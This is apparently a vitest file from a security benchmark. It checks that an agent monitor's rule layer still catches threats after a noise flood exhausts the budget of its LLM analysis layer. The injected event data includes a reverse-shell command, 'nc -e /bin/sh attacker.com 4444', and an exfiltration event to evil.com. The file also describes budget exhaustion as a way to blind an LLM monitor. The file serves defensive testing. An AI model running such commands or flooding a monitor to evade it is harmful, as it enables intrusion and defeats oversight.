// INT-007: Budget Exhaustion Attack
// ATLAS: AML.T0029 (Denial of Service)
// OWASP: A06 (Excessive Consumption)
// Scenario: Flood ARP with noise to exhaust L2 budget, then send real attack
//
// This test verifies that when the LLM budget is exhausted, L0 rules
// still function correctly and capture threat events. The L2 intelligence
// layer becomes unavailable, but the deterministic rule engine continues.

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { ArpWrapper } from '../../../src/oasb/harness/arp-wrapper';
import { BudgetController } from '../../../src/arp';
import type { AlertRule } from '../../../src/arp';

describe('INT-007: Budget Exhaustion Attack', () => {
  let arp: ArpWrapper;
  let budgetDir: string;

  const threatRules: AlertRule[] = [
    {
      name: 'critical-threat',
      condition: { category: 'threat', minSeverity: 'critical' },
      action: 'kill',
    },
    {
      name: 'high-violation',
      condition: { category: 'violation', minSeverity: 'high' },
      action: 'alert',
    },
  ];

  beforeEach(async () => {
    budgetDir = fs.mkdtempSync(path.join(os.tmpdir(), 'arp-budget-test-'));
    arp = new ArpWrapper({
      monitors: { process: false, network: false, filesystem: false },
      rules: threatRules,
    });
    await arp.start();
  });

  afterEach(async () => {
    await arp.stop();
    try {
      fs.rmSync(budgetDir, { recursive: true, force: true });
    } catch {
      // Best effort cleanup
    }
  });

  it('should create a budget controller with tiny budget', () => {
    const budget = new BudgetController(budgetDir, {
      budgetUsd: 0.01,
      maxCallsPerHour: 5,
    });

    const status = budget.getStatus();
    expect(status.budget).toBe(0.01);
    expect(status.spent).toBe(0);
    expect(status.remaining).toBe(0.01);
    expect(status.maxCallsPerHour).toBe(5);
  });

  it('should exhaust budget after repeated spend calls', () => {
    const budget = new BudgetController(budgetDir, {
      budgetUsd: 0.01,
      maxCallsPerHour: 100,
    });

    // Exhaust budget with 10 small calls
    for (let i = 0; i < 10; i++) {
      budget.record(0.002, 50);
    }

    const status = budget.getStatus();
    expect(status.spent).toBeGreaterThanOrEqual(0.01);
    expect(status.totalCalls).toBe(10);

    // Budget should be exhausted — canAfford returns false
    const canAfford = budget.canAfford(0.001);
    expect(canAfford).toBe(false);
  });

  it('should exhaust hourly rate limit with rapid calls', () => {
    const budget = new BudgetController(budgetDir, {
      budgetUsd: 100, // Large budget so dollar limit is not the issue
      maxCallsPerHour: 5,
    });

    // Make 5 calls to hit the hourly limit
    for (let i = 0; i < 5; i++) {
      budget.record(0.001, 50);
    }

    const status = budget.getStatus();
    expect(status.callsThisHour).toBe(5);

    // Should not afford another call due to hourly limit
    const canAfford = budget.canAfford(0.001);
    expect(canAfford).toBe(false);
  });

  it('should still capture threat events via L0 rules after budget exhaustion', async () => {
    const budget = new BudgetController(budgetDir, {
      budgetUsd: 0.01,
      maxCallsPerHour: 100,
    });

    // Exhaust the budget
    for (let i = 0; i < 10; i++) {
      budget.record(0.002, 50);
    }

    // Verify budget is exhausted
    expect(budget.canAfford(0.001)).toBe(false);

    // Now inject a real threat event — L0 rules should still process it
    await arp.injectEvent({
      source: 'network',
      category: 'threat',
      severity: 'critical',
      description: 'Real attack after budget exhaustion: exfiltration to evil.com',
      data: {
        remoteAddr: 'evil.com',
        remotePort: 443,
        protocol: 'tcp',
        direction: 'outbound',
        threatType: 'exfiltration',
        budgetExhausted: true,
      },
    });

    // L0 rules still capture the event
    const threats = arp.collector.eventsByCategory('threat');
    expect(threats.length).toBe(1);
    expect(threats[0].severity).toBe('critical');
    expect(threats[0].data.budgetExhausted).toBe(true);

    // L0 kill rule still triggers enforcement
    const killActions = arp.collector.enforcementsByAction('kill');
    expect(killActions.length).toBe(1);
    expect(killActions[0].reason).toContain('critical-threat');
  });

  it('should simulate noise flood followed by real attack', async () => {
    const budget = new BudgetController(budgetDir, {
      budgetUsd: 0.01,
      maxCallsPerHour: 100,
    });

    // Phase 1: Noise flood to exhaust L2 budget
    // Each noise event simulates a low-priority anomaly that would trigger L2
    for (let i = 0; i < 10; i++) {
      await arp.injectEvent({
        source: 'network',
        category: 'normal',
        severity: 'info',
        description: `Noise event #${i + 1} to exhaust budget`,
        data: { noise: true, sequence: i + 1 },
      });
      // Simulate L2 cost for each noise event
      budget.record(0.002, 50);
    }

    // Verify budget is now exhausted
    expect(budget.canAfford(0.001)).toBe(false);

    // Phase 2: Real attack arrives after budget is exhausted
    await arp.injectEvent({
      source: 'process',
      category: 'violation',
      severity: 'high',
      description: 'Real attack: suspicious binary after noise flood',
      data: {
        pid: 80001,
        binary: 'nc',
        command: 'nc -e /bin/sh attacker.com 4444',
        user: 'agent',
        phase: 'real-attack',
      },
    });

    await arp.injectEvent({
      source: 'network',
      category: 'threat',
      severity: 'critical',
      description: 'Real attack: exfiltration after noise flood',
      data: {
        remoteAddr: 'attacker.com',
        remotePort: 4444,
        protocol: 'tcp',
        direction: 'outbound',
        phase: 'real-attack',
      },
    });

    // L0 rules still detect the real attack
    const violations = arp.collector.eventsByCategory('violation');
    expect(violations.length).toBe(1);

    const threats = arp.collector.eventsByCategory('threat');
    expect(threats.length).toBe(1);

    // Enforcement still fires
    const alertActions = arp.collector.enforcementsByAction('alert');
    expect(alertActions.length).toBe(1);

    const killActions = arp.collector.enforcementsByAction('kill');
    expect(killActions.length).toBe(1);

    // Document: L2 assessment cannot run because budget is exhausted.
    // The attack is still detected by L0 rules, but without LLM-assisted
    // analysis, there may be reduced confidence in the classification.
    const budgetStatus = budget.getStatus();
    expect(budgetStatus.percentUsed).toBeGreaterThanOrEqual(100);
  });

  it('should track budget status accurately through exhaustion', () => {
    const budget = new BudgetController(budgetDir, {
      budgetUsd: 0.05,
      maxCallsPerHour: 100,
    });

    // Record some spending
    budget.record(0.01, 100);
    let status = budget.getStatus();
    expect(status.spent).toBe(0.01);
    expect(status.remaining).toBe(0.04);
    expect(status.percentUsed).toBe(20);
    expect(budget.canAfford(0.01)).toBe(true);

    // Spend more
    budget.record(0.02, 200);
    status = budget.getStatus();
    expect(status.spent).toBe(0.03);
    expect(status.remaining).toBe(0.02);
    expect(status.percentUsed).toBe(60);

    // Exhaust the rest
    budget.record(0.02, 200);
    status = budget.getStatus();
    expect(status.spent).toBe(0.05);
    expect(status.remaining).toBe(0);
    expect(status.percentUsed).toBe(100);
    expect(budget.canAfford(0.001)).toBe(false);
  });
});
